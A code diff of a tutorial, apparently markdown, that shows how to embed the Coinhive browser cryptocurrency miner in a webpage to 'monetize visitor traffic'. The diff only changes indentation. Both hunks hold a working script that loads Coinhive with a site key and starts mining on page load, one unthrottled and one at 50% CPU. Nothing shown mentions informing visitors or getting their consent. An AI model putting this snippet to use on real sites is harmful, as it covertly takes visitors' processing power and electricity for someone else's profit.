@@ -25,14 +25,14 @@ Step 3: Add the following code snippet to your webpage/webpages.
 <!-- Monetizing visitor traffic -->
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-    // What site-key do we use?
-    var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key
+  // What site-key do we use?
+  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key
 
-    // Get instance of the miner
-    var miner = new CoinHive.Anonymous(key);
+  // Get instance of the miner
+  var miner = new CoinHive.Anonymous(key);
 
-    // Start this baby up!
-    miner.start();
+  // Start this baby up!
+  miner.start();
 </script>
 ```
 
@@ -43,14 +43,14 @@ snippet, we set a 50% throttle for the miner CPU cycles consumed.
 <!-- Monetizing visitor traffic -->
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-    // What site-key do we use?
-    var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key
+  // What site-key do we use?
+  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key
 
-    // Get instance of the miner
-    var miner = new CoinHive.Anonymous(key, { throttle: 0.5 });
+  // Get instance of the miner
+  var miner = new CoinHive.Anonymous(key, { throttle: 0.5 });
 
-    // Start this baby up!
-    miner.start();
+  // Start this baby up!
+  miner.start();
 </script>
 ```
 
